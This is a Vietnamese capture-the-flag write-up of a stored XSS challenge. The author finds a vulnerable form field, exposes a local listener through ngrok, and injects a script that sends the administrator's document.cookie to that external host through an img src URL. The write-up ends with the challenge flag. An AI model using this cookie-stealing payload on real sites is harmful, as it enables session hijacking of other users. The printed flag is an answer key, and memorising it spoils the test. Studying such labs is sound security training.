# XSS - Stored 1
## Solution

Khi truy cập vào website thì có một form lưu thông tin như này


![image](https://user-images.githubusercontent.com/86184794/159664259-79e3a041-fa21-4d75-bd7d-8aaa5ce6ac85.png)

Để kiểm tra xem form này có bị lỗi XSS không thì ta nhập lần lượt các mã javascript vào để kiểm tra 

![image](https://user-images.githubusercontent.com/86184794/159664615-bcbe9a78-329a-4dc0-8b21-6ff93968e6c3.png)


Ô input đầu tiên không bị lỗi XSS.

![image](https://user-images.githubusercontent.com/86184794/159664803-f60ef3d9-884f-448d-806c-d16fa3d84add.png)

Ô input thứ hai bị lỗi XSS.


![image](https://user-images.githubusercontent.com/86184794/159664884-b179cbb0-abf6-46ec-89c3-921f6c0d9dc6.png)

Như vậy ta có thể khai thác chương trình bằng lỗi XSS ở ô input thứ hai.

Bây giờ chúng ta phải lấy cookie của quản trị viên server. Để lấy được cookie thì chúng ta có thể sử dụng document.cookie nhưng vấn dề là làm sao chúng ta có thể có nó được trong khi code javascript thì không thể leo thang đặc quyền bằng các lệnh alert,console.log,...Những lệnh này chỉ show được cookie của máy chúng ta.

Vì thế hướng giải quyết bài này là chúng ta phải đánh lừa quản trị viên server gửi cookie của họ đến máy chủ mà chúng ta kiểm soát. Để làm điều đó chúng ta sẽ nghĩ đến mốt số thẻ có thuộc tính src như img,.. để chứa liên kết máy chủ của chúng ta.

Để giải quyết được challenge này đầu tiên chúng phải tạo ra một server có thể lắng nghe trên mạng.

![image](https://user-images.githubusercontent.com/86184794/159666652-194e4314-5a8d-4cf6-9969-f9e8e81ab998.png)

Ở đây thì em đã tạo ra một server lắng nghe ở localhost port 11111 trên kali linux nhưng vẫn chưa đủ chúng ta cần phải public server đó ra ngoài internet.

Do đó em dùng ngrok để public server ra internet.


![image](https://user-images.githubusercontent.com/86184794/159667039-63016f43-5084-4eb9-a2f1-145cb21600e9.png)

![image](https://user-images.githubusercontent.com/86184794/159667120-9ebb245d-294d-4bef-81aa-d57da1b581e2.png)

ngrok cho chúng ta 2 đường dẫn public để truy cập vào server.

Việc tạo server đã xong giờ em đi tạo code để đánh lừa quản trị viên server cung cấp cookie cho server ảo mà em vừa tạo ra.

```
<script> document.write('<img src="http://9574-113-161-66-224.ngrok.io?cookie='+document.cookie+'"/>');</script>
```


Đây là code để đánh lừa quản trị viên server. Trong thuộc tính src của thẻ img sẽ chứa đường link đến server ảo em vừa mới tạo và em sẽ gọi đến cookie để truy cập đến cookie của server.

![image](https://user-images.githubusercontent.com/86184794/159668364-afa181ea-bf8f-4b10-a823-caa10dfd1f2a.png)

Đây là kết quả sau khi gửi form cho server.

![image](https://user-images.githubusercontent.com/86184794/159671042-e3a34a8f-17a6-4ff0-863b-7d4b5492ad62.png)


Flag: NkI9qe4cdLIO2P7MIsWS8ofD6
